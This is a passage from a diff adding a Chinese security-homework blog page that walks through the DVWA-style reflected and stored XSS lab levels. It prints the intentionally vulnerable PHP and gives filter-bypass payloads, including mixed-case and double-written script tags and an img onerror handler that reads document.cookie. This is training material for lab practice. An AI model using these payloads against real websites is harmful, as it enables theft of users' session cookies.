+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="hljs-string">'name'</span> ] . <span class="hljs-string">'&lt;/pre&gt;'</span>;
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p>
+<p>先测试一下</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" srcset="/img/loading.gif" alt="image-20201026202557058"></p>
+<p>获取cookie</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" srcset="/img/loading.gif" alt="image-20201026202647823"></p>
+<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
+    <span class="hljs-comment">// Feedback for end user</span>
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>代码审计后可以发现是对输入的内容进行了过滤，将<strong>&lt;script&gt;</strong>替换为空，可以双写绕过，也可以大小写绕过。</p>
+<p>构造payload：</p>
+<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+
+&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
+//使用其他标签
+<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p>
+<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
+    <span class="hljs-comment">// Feedback for end user</span>
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
+<p>构造payload：</p>
+<div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p>
+<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
+
+    <span class="hljs-comment">// Sanitize message input</span>
+    $message = stripslashes( $message );
+    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Sanitize name input</span>
+    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Update database</span>
+    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">//mysql_close();</span>
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p>
+<p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
+<p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p>
+<p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p>
+<p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p>
+<p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
+<p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-20201026203255791"></p>
+<p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
+<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
+
+    <span class="hljs-comment">// Sanitize message input</span>
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+    $message = htmlspecialchars( $message );
+
+    <span class="hljs-comment">// Sanitize name input</span>
+    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );
+    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Update database</span>
+    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">//mysql_close();</span>
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );
+$message = htmlspecialchars( $message );
+$name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div>
+
+<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
+<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
+<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
+<p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码</p>
+<p>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS，与反射型中级的一样的方法</p>
+<p>payload</p>
+<div class="hljs"><pre><code class="hljs django"><span class="xml">使用双写绕过，输入  <span class="hljs-tag">&lt;<span class="hljs-name">scr</span>&lt;<span class="hljs-attr">script</span>&gt;</span>ipt&gt;alert(document.cookie)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span>
+<span class="xml">使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span>
+<span class="xml">输入其他标签，如  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" srcset="/img/loading.gif" alt="xssstored2.png"></p>
+<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
+
+    <span class="hljs-comment">// Sanitize message input</span>
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+    $message = htmlspecialchars( $message );
+
+    <span class="hljs-comment">// Sanitize name input</span>
+    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );
+    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Update database</span>
+    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">//mysql_close();</span>
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );
+$message = htmlspecialchars( $message );
+$name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div>
+
+<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
+<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
+<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
+<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
+<p>只能换一个标签</p>
+<div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>
+
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A/">网安作业</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
+                    
+                      <a class="hover-with-bg" href="/tags/xss/">xss</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blind-sql/">blind sql</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "网安作业2&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
